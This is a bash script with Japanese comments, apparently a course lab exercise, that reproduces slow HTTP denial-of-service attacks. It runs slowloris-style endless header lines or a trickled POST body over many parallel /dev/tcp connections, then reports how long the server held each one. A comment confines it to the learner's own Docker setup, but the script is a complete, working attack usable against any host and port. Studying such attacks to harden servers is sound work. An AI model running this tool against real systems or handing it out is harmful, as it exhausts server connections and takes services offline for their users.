#!/usr/bin/env bash
# 遅い攻撃を再現する(Day 7 Step 3)。対象は自分の Docker 環境の中だけにすること。
#
# 使い方: slow-attack.sh <header|body> <ホスト> <ポート> <接続数> [何秒ごとに少し送るか]
#   header : ヘッダーを1行ずつ送り続け、ヘッダーの終わりを送らない(slowloris)
#   body   : ヘッダーは送り切り、本文(100KB と宣言)を10バイトずつ送り続ける
#
# サーバに接続を切られたら、何秒つながっていたかを表示する。
mode=$1; host=$2; port=$3; n=$4; every=${5:-5}
trap "" PIPE   # 切られた接続に書き込んでも、スクリプトごと終了しないようにする

for i in $(seq 1 "$n"); do
  (
    exec 3<>"/dev/tcp/$host/$port" || { echo "[$i] 接続できなかった"; exit; }
    if [ "$mode" = header ]; then
      printf "GET /whoami HTTP/1.1\r\nHost: x\r\n" >&3
    else
      printf "POST /upload HTTP/1.1\r\nHost: x\r\nContent-Type: application/octet-stream\r\nContent-Length: 100000\r\n\r\n" >&3
    fi
    start=$SECONDS
    while sleep "$every"; do
      if [ "$mode" = header ]; then
        printf "X-a-%d: b\r\n" "$RANDOM" >&3 2>/dev/null
      else
        printf "0123456789" >&3 2>/dev/null
      fi || { echo "[$i] $((SECONDS - start))秒でサーバに切られた"; break; }
    done
  ) &
done
wait
